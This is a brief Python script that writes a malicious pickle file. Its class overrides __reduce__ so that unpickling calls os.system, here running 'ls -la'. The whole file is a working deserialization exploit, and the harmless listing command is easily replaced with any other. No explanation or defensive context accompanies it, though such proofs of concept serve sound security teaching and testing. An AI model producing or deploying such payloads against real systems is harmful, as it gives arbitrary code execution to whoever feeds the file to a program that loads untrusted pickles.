#!/usr/bin/env python3

import pickle, os

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("ls -la",))

pickle.dump(SerializedPickle(), open('malicious_pickle','wb'))